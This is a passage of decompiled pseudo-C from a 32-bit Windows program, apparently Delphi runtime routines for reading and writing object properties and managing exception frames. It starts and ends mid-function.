{
  int v2; // esi
  int v3; // ecx
  int v4; // esi
  int result; // eax
  int v6; // edi
  int v7; // ebx
  int *v8; // esi

  v2 = a1;
  memset(a2, 0, 4 * *(unsigned __int16 *)(a1 + *(unsigned __int8 *)(a1 + 1) + 10));
  v3 = 0;
  while ( 1 )
  {
    LOBYTE(v3) = *(_BYTE *)(v2 + 1);
    v4 = v2 + v3 + 2;
    LOBYTE(v3) = *(_BYTE *)(v4 + 10);
    result = *(unsigned __int16 *)(v4 + v3 + 11);
    if ( *(_WORD *)(v4 + v3 + 11) )
    {
      v6 = v4 + v3 + 13;
      do
      {
        v7 = *(unsigned __int16 *)(v6 + 24);
        LOBYTE(v3) = *(_BYTE *)(v6 + 26);
        if ( !*((_DWORD *)a2 + v7) )
          *((_DWORD *)a2 + v7) = v6;
        v6 += v3 + 27;
        --result;
      }
      while ( result );
    }
    v8 = *(int **)(v4 + 4);
    v3 = 0;
    if ( !v8 )
      break;
    v2 = *v8;
  }
  return result;
}

//----- (00416630) --------------------------------------------------------
char __usercall sub_416630@<al>(_DWORD *a1@<eax>, int a2@<edx>)
{
  unsigned int v2; // ecx

  v2 = *(_DWORD *)(a2 + 12);
  if ( (v2 & 0xFFFFFF00) != 0 )
  {
    if ( *(_BYTE *)(a2 + 15) < 0xFEu )
      return ((int (*)(void))v2)();
    if ( *(_BYTE *)(a2 + 15) != 0xFF )
      return (*(int (**)(void))(*a1 + (__int16)v2))();
    LOBYTE(v2) = *((_BYTE *)a1 + (v2 & 0xFFFFFF));
  }
  return v2;
}

//----- (00416660) --------------------------------------------------------
char __usercall sub_416660@<al>(_DWORD *a1@<eax>, int a2@<edx>)
{
  _BYTE *v2; // edi
  char v3; // bl
  unsigned int v4; // ecx
  char *v5; // ecx

  v2 = **(_BYTE ***)a2;
  v3 = 4;
  if ( *v2 != 7 )
    v3 = v2[(unsigned __int8)v2[1] + 2];
  v4 = *(_DWORD *)(a2 + 4);
  if ( *(_BYTE *)(a2 + 7) < 0xFEu )
  {
    LOBYTE(a1) = ((int (*)(void))v4)();
  }
  else if ( *(_BYTE *)(a2 + 7) == 0xFF )
  {
    v5 = (char *)a1 + (v4 & 0xFFFFFF);
    LOBYTE(a1) = *v5;
    if ( (unsigned __int8)v3 >= 2u )
    {
      LOWORD(a1) = *(_WORD *)v5;
      if ( (unsigned __int8)v3 >= 4u )
        return *(_DWORD *)v5;
    }
  }
  else
  {
    LOBYTE(a1) = (*(int (**)(void))(*a1 + (__int16)v4))();
  }
  return (char)a1;
}

//----- (004166D4) --------------------------------------------------------
_BYTE *__usercall sub_4166D4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  _BYTE *v4; // esi
  char v5; // bl
  int v6; // edx
  unsigned int v7; // esi
  _BYTE *result; // eax

  v4 = **(_BYTE ***)a2;
  v5 = 4;
  if ( *v4 != 7 )
    v5 = v4[(unsigned __int8)v4[1] + 2];
  v6 = *(_DWORD *)(a2 + 16);
  if ( v6 == 0x80000000 )
    v6 = a3;
  v7 = *(_DWORD *)(a2 + 8);
  if ( *(_BYTE *)(a2 + 11) == 0xFF )
  {
    result = (char *)a1 + (v7 & 0xFFFFFF);
    *result = a3;
    if ( (unsigned __int8)v5 >= 2u )
    {
      *(_WORD *)result = a3;
      if ( (unsigned __int8)v5 >= 4u )
        *(_DWORD *)result = a3;
    }
  }
  else if ( *(_BYTE *)(a2 + 11) < 0xFEu )
  {
    return (_BYTE *)((int (__fastcall *)(int, int))v7)(a3, v6);
  }
  else
  {
    return (_BYTE *)(*(int (__fastcall **)(int, int))(*a1 + (__int16)v7))(a3, v6);
  }
  return result;
}

//----- (00416730) --------------------------------------------------------
_DWORD *__userpurge sub_416730@<eax>(_DWORD *result@<eax>, int a2@<edx>, char *a3@<ecx>, int a4)
{
  char *v5; // edx
  unsigned int v6; // esi

  v5 = *(char **)(a2 + 16);
  if ( v5 == (char *)0x80000000 )
    v5 = a3;
  v6 = *(_DWORD *)(a2 + 4);
  if ( *(_BYTE *)(a2 + 7) == 0xFF )
  {
    qmemcpy(a3, (char *)result + (v6 & 0xFFFFFF), *((unsigned __int8 *)result + (v6 & 0xFFFFFF)) + 1);
  }
  else if ( *(_BYTE *)(a2 + 7) < 0xFEu )
  {
    return (_DWORD *)((int (__fastcall *)(char *, char *))v6)(a3, v5);
  }
  else
  {
    return (_DWORD *)(*(int (__fastcall **)(char *, char *))(*result + (__int16)v6))(a3, v5);
  }
  return result;
}

//----- (00416774) --------------------------------------------------------
unsigned __int8 __usercall sub_416774@<al>(_DWORD *a1@<eax>, int **a2@<edx>, unsigned __int8 *a3@<ecx>)
{
  unsigned __int8 *v4; // edx
  unsigned int v5; // edi
  unsigned __int8 result; // al
  unsigned __int8 *v7; // edi
  int v8; // eax
  unsigned int v10; // ecx
  const void *v11; // esi

  v4 = (unsigned __int8 *)a2[4];
  if ( v4 == (unsigned __int8 *)0x80000000 )
    v4 = a3;
  v5 = (unsigned int)a2[2];
  if ( *((_BYTE *)a2 + 11) == 0xFF )
  {
    v7 = (unsigned __int8 *)a1 + (v5 & 0xFFFFFF);
    v8 = **a2;
    v10 = *(unsigned __int8 *)(v8 + 1);
    LOBYTE(v10) = *(_BYTE *)(v8 + v10 + 2);
    result = *a3;
    v11 = a3 + 1;
    if ( result >= (unsigned __int8)v10 )
      result = v10;
    *v7 = result;
    LOBYTE(v10) = result;
    qmemcpy(v7 + 1, v11, v10);
  }
  else if ( *((_BYTE *)a2 + 11) < 0xFEu )
  {
    return ((int (__fastcall *)(unsigned __int8 *, unsigned __int8 *))v5)(a3, v4);
  }
  else
  {
    return (*(int (__fastcall **)(unsigned __int8 *, unsigned __int8 *))(*a1 + (__int16)v5))(a3, v4);
  }
  return result;
}

//----- (004167C8) --------------------------------------------------------
_DWORD *__usercall sub_4167C8@<eax>(_DWORD *a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  char v5[260]; // [esp+0h] [ebp-104h] BYREF

  sub_416730(a1, a2, v5, 255);
  return sub_4044C8(a3, v5);
}

//----- (004167F0) --------------------------------------------------------
unsigned __int8 __usercall sub_4167F0@<al>(_DWORD *a1@<eax>, int **a2@<edx>, char *a3@<ecx>)
{
  unsigned __int8 v6[268]; // [esp+0h] [ebp-10Ch] BYREF

  sub_404500(v6, a3, 255);
  return sub_416774(a1, a2, v6);
}

//----- (00416824) --------------------------------------------------------
volatile __int32 *__usercall sub_416824@<eax>(volatile __int32 *a1@<eax>, __int32 a2@<edx>)
{
  return sub_4042C0(a1, a2);
}

//----- (00416838) --------------------------------------------------------
volatile __int32 *__usercall sub_416838@<eax>(_DWORD *a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  volatile __int32 *v4; // edx
  unsigned int v5; // esi

  v4 = *(volatile __int32 **)(a2 + 16);
  if ( v4 == (volatile __int32 *)0x80000000 )
    v4 = a3;
  v5 = *(_DWORD *)(a2 + 4);
  if ( *(_BYTE *)(a2 + 7) == 0xFF )
    return sub_416824(a3, *(_DWORD *)((char *)a1 + (v5 & 0xFFFFFF)));
  if ( *(_BYTE *)(a2 + 7) < 0xFEu )
    return (volatile __int32 *)((int (__fastcall *)(volatile __int32 *, volatile __int32 *))v5)(a3, v4);
  return (volatile __int32 *)(*(int (__fastcall **)(volatile __int32 *, volatile __int32 *))(*a1 + (__int16)v5))(a3, v4);
}

//----- (00416878) --------------------------------------------------------
volatile __int32 *__usercall sub_416878@<eax>(_DWORD *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  __int32 v4; // edx
  unsigned int v5; // edi

  v4 = *(_DWORD *)(a2 + 16);
  if ( v4 == 0x80000000 )
    v4 = a3;
  v5 = *(_DWORD *)(a2 + 8);
  if ( *(_BYTE *)(a2 + 11) == 0xFF )
    return sub_416824((_DWORD *)((char *)a1 + (v5 & 0xFFFFFF)), a3);
  if ( *(_BYTE *)(a2 + 11) < 0xFEu )
    return (volatile __int32 *)((int (__fastcall *)(__int32, __int32))v5)(a3, v4);
  return (volatile __int32 *)(*(int (__fastcall **)(__int32, __int32))(*a1 + (__int16)v5))(a3, v4);
}

//----- (004168B8) --------------------------------------------------------
OLECHAR **__fastcall sub_4168B8(char **a1, int a2)
{
  unsigned int v4[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v5; // [esp-10h] [ebp-14h]
  OLECHAR *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_416900;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_4169D4(&v6, a2);
  sub_4044EC(a1, v6);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_416907;
  return sub_404900(&v6);
}
// 4169D4: using guessed type int __fastcall sub_4169D4(_DWORD, _DWORD);

//----- (00416910) --------------------------------------------------------
OLECHAR **__usercall sub_416910@<eax>(_DWORD *a1@<eax>, int a2@<edx>, const CHAR *a3@<ecx>)
{
  unsigned int v6[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v7; // [esp-10h] [ebp-14h]
  OLECHAR *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_416958;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_404A4C((int *)&v8, a3);
  sub_416ABC(a1, a2, v8);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41695F;
  return sub_404900(&v8);
}

//----- (00416968) --------------------------------------------------------
OLECHAR **__usercall sub_416968@<eax>(_DWORD *a1@<eax>, _BYTE ***a2@<edx>, char **a3@<ecx>)
{
  switch ( ***a2 )
  {
    case 5:
      return (OLECHAR **)sub_4167C8(a1, (int)a2, a3);
    case 0xA:
      return (OLECHAR **)sub_416838(a1, (int)a2, (volatile __int32 *)a3);
    case 0xB:
      return sub_4168B8(a3, (int)a2);
  }
  return (OLECHAR **)sub_40426C(a3);
}

//----- (004169A8) --------------------------------------------------------
char __usercall sub_4169A8@<al>(_DWORD *a1@<eax>, int **a2@<edx>, char *a3@<ecx>)
{
  switch ( *(_BYTE *)**a2 )
  {
    case 5:
      LOBYTE(a1) = sub_4167F0(a1, a2, a3);
      break;
    case 0xA:
      LOBYTE(a1) = (unsigned __int8)sub_416878(a1, (int)a2, (__int32)a3);
      break;
    case 0xB:
      LOBYTE(a1) = (unsigned __int8)sub_416910(a1, (int)a2, a3);
      break;
  }
  return (char)a1;
}

//----- (004169D4) --------------------------------------------------------
_DWORD *__usercall sub_4169D4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  int v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  char *v9; // [esp+8h] [ebp-10h] BYREF
  void (__cdecl *v10)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *); // [esp+Ch] [ebp-Ch]
  _DWORD *v11; // [esp+10h] [ebp-8h]
  int *v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = 0;
  v12 = a3;
  v8 = &savedregs;
  v7 = &loc_416AAC;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( ***(_BYTE ***)a2 == 5 || ***(_BYTE ***)a2 == 10 )
  {
    sub_416968(a1, (_BYTE ***)a2, &v9);
    sub_404A4C(v12, v9);
  }
  else if ( ***(_BYTE ***)a2 == 11 )
  {
    v4 = *(_DWORD *)(a2 + 4);
    if ( (v4 & 0xFF000000) == -16777216 )
    {
      sub_40493C((OLECHAR **)v12, *(const OLECHAR **)((char *)a1 + (v4 & 0xFFFFFF)));
    }
    else
    {
      if ( (v4 & 0xFF000000) == -33554432 )
        v10 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))((__int16)v4 + *a1);
      else
        v10 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(a2 + 4);
      v11 = a1;
      if ( *(_DWORD *)(a2 + 16) == 0x80000000 )
        v10(ExceptionList, v7, v8);
      else
        ((void (__fastcall *)(int *, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))v10)(
          v12,
          *(_DWORD *)(a2 + 16),
          ExceptionList,
          v7,
          v8);
    }
  }
  else
  {
    sub_404900((OLECHAR **)v12);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v8 = (int *)&loc_416AB3;
  return sub_40426C(&v9);
}

//----- (00416ABC) --------------------------------------------------------
_DWORD *__usercall sub_416ABC@<eax>(_DWORD *a1@<eax>, int a2@<edx>, const WCHAR *a3@<ecx>)
{
  int v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v8; // [esp-8h] [ebp-20h]
  int *v9; // [esp-4h] [ebp-1Ch]
  char *v10; // [esp+Ch] [ebp-Ch] BYREF
  void (__cdecl *v11)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *); // [esp+10h] [ebp-8h]
  _DWORD *v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8 = &loc_416B82;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( ***(_BYTE ***)a2 == 5 || ***(_BYTE ***)a2 == 10 )
  {
    sub_4044EC(&v10, a3);
    sub_4169A8(v10, a2, ExceptionList, v8, v9);
  }
  else if ( ***(_BYTE ***)a2 == 11 )
  {
    v5 = *(_DWORD *)(a2 + 8);
    if ( (v5 & 0xFF000000) == -16777216 )
    {
      sub_40493C((OLECHAR **)((char *)a1 + (v5 & 0xFFFFFF)), a3);
    }
    else
    {
      if ( (v5 & 0xFF000000) == -33554432 )
        v11 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))((__int16)v5 + *a1);
      else
        v11 = *(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(a2 + 8);
      v12 = a1;
      if ( *(_DWORD *)(a2 + 16) == 0x80000000 )
        v11(ExceptionList, v8, v9);
      else
        ((void (__fastcall *)(const WCHAR *, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))v11)(
          a3,
          *(_DWORD *)(a2 + 16),
          ExceptionList,
          v8,
          v9);
    }
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v9 = (int *)&loc_416B89;
  return sub_40426C(&v10);
}
// 4169A8: using guessed type int __fastcall sub_4169A8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00416B90) --------------------------------------------------------
double __usercall sub_416B90@<st0>(_DWORD *a1@<eax>, int a2@<edx>)
{
  double (*v3)(void); // edx
  float *v4; // esi
  double v6; // [esp+0h] [ebp-1Ch]
  double (*v7)(void); // [esp+Ch] [ebp-10h]

  v3 = *(double (**)(void))(a2 + 4);
  if ( ((unsigned int)v3 & 0xFF000000) == -16777216 )
  {
    v4 = (float *)((char *)a1 + ((unsigned int)v3 & 0xFFFFFF));
    switch ( *(_BYTE *)sub_4163BC(**(_DWORD **)a2) )
    {
      case 0:
        v6 = *v4;
        break;
      case 1:
        v6 = *(double *)v4;
        break;
      case 2:
        v6 = *(double *)v4;
        break;
      case 3:
        v6 = (double)*(__int64 *)v4;
        break;
      case 4:
        v6 = (double)*(__int64 *)v4 / 10000.0;
        break;
      default:
        v6 = 0.0;
        break;
    }
  }
  else
  {
    if ( ((unsigned int)v3 & 0xFF000000) == -33554432 )
      v7 = *(double (**)(void))((__int16)v3 + *a1);
    else
      v7 = v3;
    v6 = v7();
    if ( *(_BYTE *)sub_4163BC(**(_DWORD **)a2) == 4 )
      return v6 / 10000.0;
  }
  return v6;
}

//----- (00416CA8) --------------------------------------------------------
__int16 __userpurge sub_416CA8@<ax>(_DWORD *a1@<eax>, int a2@<edx>, _TBYTE a3)
{
  unsigned int v5; // ebx
  char v6; // al
  float *v7; // edx
  int v8; // eax
  float v10; // [esp+4h] [ebp-18h]
  int (__stdcall *v11)(_DWORD); // [esp+14h] [ebp-8h]

  v5 = *(_DWORD *)(a2 + 8);
  v6 = *(_BYTE *)sub_4163BC(**(_DWORD **)a2);
  if ( (v5 & 0xFF000000) == -16777216 )
  {
    v7 = (float *)((char *)a1 + (v5 & 0xFFFFFF));
    v8 = v6 & 0x7F;
    switch ( v8 )
    {
      case 0:
        *v7 = *(double *)&a3;
        break;
      case 1:
        *(double *)v7 = *(double *)&a3;
        break;
      case 2:
        *(_TBYTE *)v7 = a3;
        LOWORD(v8) = HIWORD(a3);
        break;
      case 3:
        *(_QWORD *)v7 = (__int64)*(double *)&a3;
        break;
      case 4:
        *(_QWORD *)v7 = (__int64)(*(double *)&a3 * 10000.0);
        break;
      default:
        return v8;
    }
  }
  else
  {
    if ( (v5 & 0xFF000000) == -33554432 )
      v11 = *(int (__stdcall **)(_DWORD))((__int16)v5 + *a1);
    else
      v11 = (int (__stdcall *)(_DWORD))v5;
    if ( *(_DWORD *)(a2 + 16) == 0x80000000 )
    {
      v8 = v6 & 0x7F;
      switch ( v8 )
      {
        case 0:
          goto LABEL_13;
        case 1:
          goto LABEL_14;
        case 2:
          goto LABEL_15;
        case 3:
          goto LABEL_16;
        case 4:
          goto LABEL_18;
        default:
          return v8;
      }
    }
    else
    {
      v8 = v6 & 0x7F;
      switch ( v8 )
      {
        case 0:
LABEL_13:
          v10 = *(double *)&a3;
          LOWORD(v8) = v11(LODWORD(v10));
          break;
        case 1:
LABEL_14:
          LOWORD(v8) = ((int (__stdcall *)(_DWORD, _DWORD))v11)(LODWORD(a3), DWORD1(a3));
          break;
        case 2:
LABEL_15:
          LOWORD(v8) = HIWORD(a3);
          LOWORD(v8) = ((int (__stdcall *)(_DWORD, _DWORD, int))v11)(LODWORD(a3), DWORD1(a3), v8);
          break;
        case 3:
LABEL_16:
          LOWORD(v8) = ((int (__stdcall *)(_DWORD, _DWORD))v11)(
                         (__int64)*(double *)&a3,
                         (unsigned __int64)(__int64)*(double *)&a3 >> 32);
          break;
        case 4:
LABEL_18:
          LOWORD(v8) = ((int (__stdcall *)(_DWORD, _DWORD))v11)(
                         (__int64)(*(double *)&a3 * 10000.0),
                         (unsigned __int64)(__int64)(*(double *)&a3 * 10000.0) >> 32);
          break;
        default:
          return v8;
      }
    }
  }
  return v8;
}

//----- (00416EA0) --------------------------------------------------------
int __fastcall sub_416EA0(int a1, int a2)
{
  return sub_4050B0(a1, a2);
}
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);

//----- (00416EB4) --------------------------------------------------------
int __usercall sub_416EB4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // edx
  unsigned int v5; // esi

  v4 = *(_DWORD *)(a2 + 16);
  if ( v4 == 0x80000000 )
    v4 = a3;
  v5 = *(_DWORD *)(a2 + 4);
  if ( *(_BYTE *)(a2 + 7) == 0xFF )
    return sub_416EA0(a3, (int)a1 + (v5 & 0xFFFFFF));
  if ( *(_BYTE *)(a2 + 7) < 0xFEu )
    return ((int (__fastcall *)(int, int))v5)(a3, v4);
  return (*(int (__fastcall **)(int, int))(*a1 + (__int16)v5))(a3, v4);
}

//----- (00416EF4) --------------------------------------------------------
int __usercall sub_416EF4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // edx
  int (__fastcall *v5)(int, int); // edi

  v4 = *(_DWORD *)(a2 + 16);
  if ( v4 == 0x80000000 )
    v4 = a3;
  v5 = *(int (__fastcall **)(int, int))(a2 + 8);
  if ( *(_BYTE *)(a2 + 11) == 0xFF )
    return sub_416EA0(a3, a3);
  if ( *(_BYTE *)(a2 + 11) < 0xFEu )
    return v5(a3, v4);
  return (*(int (__fastcall **)(int, int))(*a1 + (__int16)v5))(a3, v4);
}

//----- (00416F34) --------------------------------------------------------
_DWORD *__usercall sub_416F34@<eax>(_DWORD *a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>)
{
  _DWORD *v4; // edx
  unsigned int v5; // ebx
  _DWORD *result; // eax
  int v7; // ebx

  v4 = *(_DWORD **)(a2 + 16);
  if ( v4 == (_DWORD *)0x80000000 )
    v4 = a3;
  v5 = *(_DWORD *)(a2 + 4);
  if ( *(_BYTE *)(a2 + 7) == 0xFF )
  {
    result = (_DWORD *)((char *)a1 + (v5 & 0xFFFFFF));
    v7 = result[1];
    *a3 = *result;
    a3[1] = v7;
  }
  else if ( *(_BYTE *)(a2 + 7) < 0xFEu )
  {
    return (_DWORD *)((int (__fastcall *)(_DWORD *, _DWORD *))v5)(a3, v4);
  }
  else
  {
    return (_DWORD *)(*(int (__fastcall **)(_DWORD *, _DWORD *))(*a1 + (__int16)v5))(a3, v4);
  }
  return result;
}

//----- (00416F74) --------------------------------------------------------
_DWORD *__usercall sub_416F74@<eax>(_DWORD *a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>)
{
  unsigned int v3; // ebx
  _DWORD *result; // eax
  int v5; // ebx
  int v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]

  v3 = *(_DWORD *)(a2 + 8);
  if ( *(_BYTE *)(a2 + 11) == 0xFF )
  {
    result = (_DWORD *)((char *)a1 + (v3 & 0xFFFFFF));
    v5 = a3[1];
    *result = *a3;
    result[1] = v5;
  }
  else
  {
    v7 = a3[1];
    v6 = *a3;
    if ( *(_BYTE *)(a2 + 11) < 0xFEu )
      return (_DWORD *)((int (__stdcall *)(int, int))v3)(v6, v7);
    else
      return (_DWORD *)(*(int (__stdcall **)(int, int))(*a1 + (__int16)v3))(v6, v7);
  }
  return result;
}

//----- (00416FAC) --------------------------------------------------------
int __usercall sub_416FAC@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  unsigned int v2; // ecx

  v2 = *(_DWORD *)(a2 + 4);
  if ( HIBYTE(v2) == 0xFF )
    return *(_DWORD *)((char *)a1 + (v2 & 0xFFFFFF));
  if ( *(_BYTE *)(a2 + 7) < 0xFEu )
    return ((int (*)(void))v2)();
  return (*(int (**)(void))(*a1 + (__int16)v2))();
}

//----- (00416FD4) --------------------------------------------------------
_DWORD *__userpurge sub_416FD4@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3, int a4)
{
  unsigned int v4; // ecx
  _DWORD *result; // eax

  v4 = *(_DWORD *)(a2 + 8);
  if ( HIBYTE(v4) == 0xFF )
  {
    result = (_DWORD *)((char *)a1 + (v4 & 0xFFFFFF));
    *result = a3;
    result[1] = a4;
  }
  else if ( *(_BYTE *)(a2 + 11) < 0xFEu )
  {
    return (_DWORD *)((int (__stdcall *)(int, int))v4)(a3, a4);
  }
  else
  {
    return (_DWORD *)(*(int (__stdcall **)(int, int))(*a1 + (__int16)v4))(a3, a4);
  }
  return result;
}

//----- (00417010) --------------------------------------------------------
_DWORD *__usercall sub_417010@<eax>(_DWORD *a1@<eax>, int a2@<edx>, _DWORD *a3@<ecx>)
{
  int (*v4)(void); // edx
  int (*v6)(void); // [esp+4h] [ebp-10h]

  v4 = *(int (**)(void))(a2 + 4);
  if ( ((unsigned int)v4 & 0xFF000000) == -16777216 )
    return sub_405F58(a3, *(_DWORD *)((char *)a1 + ((unsigned int)v4 & 0xFFFFFF)));
  if ( ((unsigned int)v4 & 0xFF000000) == -33554432 )
    v6 = *(int (**)(void))((__int16)v4 + *a1);
  else
    v6 = v4;
  if ( *(_DWORD *)(a2 + 16) == 0x80000000 )
    return (_DWORD *)v6();
  else
    return (_DWORD *)((int (__fastcall *)(_DWORD *, _DWORD))v6)(a3, *(_DWORD *)(a2 + 16));
}

//----- (00417090) --------------------------------------------------------
_DWORD *__usercall sub_417090@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // ecx

  v4 = *(_DWORD *)(a2 + 8);
  if ( (v4 & 0xFF000000) == -16777216 )
    return sub_405F58((_DWORD *)((char *)a1 + (v4 & 0xFFFFFF)), a3);
  if ( (v4 & 0xFF000000) == -33554432 )
    return (_DWORD *)(*(int (__cdecl **)(_DWORD))((__int16)v4 + *a1))(*(_DWORD *)((__int16)v4 + *a1));
  return (_DWORD *)(*(int (__cdecl **)(_DWORD))(a2 + 8))(*(_DWORD *)(a2 + 8));
}

//----- (00417104) --------------------------------------------------------
int sub_417104()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_41714A;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42CBB8 )
  {
    sub_40426C(&off_42B4C0);
    sub_404CE4((int *)off_42B4B8, (char *)dword_40105C, 2);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 42B4B8: using guessed type char *off_42B4B8[2];
// 42B4C0: using guessed type int *off_42B4C0;
// 42CBB8: using guessed type int dword_42CBB8;

//----- (00417154) --------------------------------------------------------
void sub_417154()
{
  --dword_42CBB8;
}
// 42CBB8: using guessed type int dword_42CBB8;

//----- (0041715C) --------------------------------------------------------
int sub_41715C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_417181;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CBBC;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CBBC: using guessed type int dword_42CBBC;

//----- (0041718C) --------------------------------------------------------
void sub_41718C()
{
  --dword_42CBBC;
}
// 42CBBC: using guessed type int dword_42CBBC;

//----- (00418240) --------------------------------------------------------
_DWORD *__usercall sub_418240@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int v3; // edi
  _DWORD *v4; // ebx
  _DWORD *v5; // eax
  char v7; // [esp-10h] [ebp-20h]
  char v8; // [esp+Fh] [ebp-1h]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v7);
  v3 = a3;
  v8 = a2;
  v4 = a1;
  sub_403504(a1, 0);
  v4[1] = sub_403504(off_417624, 1);
  v4[2] = sub_403504(off_417AC0, 1);
  v5 = sub_403504(off_417624, 1);
  v4[3] = v5;
  sub_418B44(v5, v3);
  if ( v8 )
    sub_4038BC(v4);
  return v4;
}
// 41824E: variable 'v7' is possibly undefined
// 418253: variable 'a3' is possibly undefined
// 418255: variable 'a2' is possibly undefined
// 417624: using guessed type int (*off_417624[4])();
// 417AC0: using guessed type int (*off_417AC0[23])();

//----- (004182BC) --------------------------------------------------------
_DWORD *__usercall sub_4182BC@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_403524(v2, v3 & 0xFC);
  sub_403534((_DWORD *)v5[1]);
  sub_403534((_DWORD *)v5[2]);
  result = sub_403534((_DWORD *)v5[3]);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 4182C3: variable 'v3' is possibly undefined

//----- (004182FC) --------------------------------------------------------
int __usercall sub_4182FC@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // esi
  int v5; // ebx
  int v6; // edi

  v3 = *(_DWORD *)(a1 + 4);
  if ( *(_DWORD *)(v3 + 8) - 1 < 0 )
  {
LABEL_5:
    if ( (*(int (**)(void))(**(_DWORD **)(a1 + 8) + 84))() < 0 )
      return 0;
    else
      return (*(int (**)(void))(**(_DWORD **)(a1 + 8) + 24))();
  }
  else
  {
    v4 = *(_DWORD *)(v3 + 8);
    v5 = 0;
    while ( 1 )
    {
      v6 = sub_418C80(*(_DWORD *)(a1 + 4), v5);
      if ( sub_403498(v6, a2) )
        break;
      ++v5;
      if ( !--v4 )
        goto LABEL_5;
    }
  }
  return v6;
}

//----- (0041835C) --------------------------------------------------------
bool __usercall sub_41835C@<al>(const void *a1@<eax>, PVOID a2@<edx>)
{
  return !a2 || a2 == sub_4058CC(a1);
}

//----- (0041837C) --------------------------------------------------------
char __usercall sub_41837C@<al>(int a1@<eax>, void *a2@<edx>)
{
  int v4; // ebx
  const void *v5; // eax
  int v6; // ebx
  const void *v7; // eax
  int v8; // eax
  int v9; // ebx
  const void *v10; // eax

  v4 = *(_DWORD *)(*(_DWORD *)(a1 + 12) + 8) - 1;
  if ( v4 >= 0 )
  {
    do
    {
      v5 = (const void *)sub_418C80(*(_DWORD *)(a1 + 12), v4);
      if ( sub_41835C(v5, a2) )
        sub_418B90(*(_DWORD **)(a1 + 12), v4);
      --v4;
    }
    while ( v4 != -1 );
  }
  v6 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8) - 1;
  if ( v6 >= 0 )
  {
    do
    {
      v7 = (const void *)sub_418C80(*(_DWORD *)(a1 + 4), v6);
      if ( sub_41835C(v7, a2) )
